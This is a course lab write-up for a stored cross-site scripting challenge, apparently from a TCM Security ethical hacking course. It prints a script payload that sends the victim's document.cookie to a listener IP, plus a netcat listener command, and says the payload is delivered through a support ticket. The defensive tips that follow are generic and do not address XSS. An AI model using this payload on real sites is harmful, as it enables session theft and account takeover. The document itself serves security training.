# 🛡️ Challenge - 3

> **Course:** [Practical Ethical Hacking](../../README.md)  
> **Module:** [Common Web Vulnerabilities](./README.md)  
> **Navigation Path:** `Practical Ethical Hacking > Common Web Vulnerabilities > Challenge - 3`

---

## 🎯 Executive Summary & Technical Objectives
This document details the practical methodology, tooling, exploitation chain, and defensive remediation for **Challenge - 3** as conducted in the TCM Security lab environment.

---

## 🔬 Hands-On Walkthrough & Technical Evidence


Make the payload

```javascript
<script>var i=new Image; i.src="http://192.168.182.131:1234/?"+document.cookie;</script>
```

Set up Net Cat listener

```javascript
nc -nvlp 1234
```

Send the payload through the support ticket

Net cat will capture once the ticket is viewed


![Lab Execution Screenshot / Proof of Exploit](./assets/237_Challenge_-_3_1cdd64c5-e0cb-80ba-a7d5-c876df01bacd.png)
*Figure: Lab Execution Screenshot / Proof of Exploit*






---

## 🛡️ Defensive Hardening & Detection Signatures
- **Monitoring & Auditing:** Enable granular auditing for process creation (Windows Event ID 4688 / Sysmon Event 1) and network connections (Sysmon Event 3).
- **Least Privilege:** Enforce strict principle of least privilege across user accounts and service configurations.
- **Continuous Validation:** Conduct routine vulnerability scanning and automated configuration reviews to identify drift.

---
[⬅ Back to Common Web Vulnerabilities](./README.md) • [🏠 Master Course Index](../README.md)
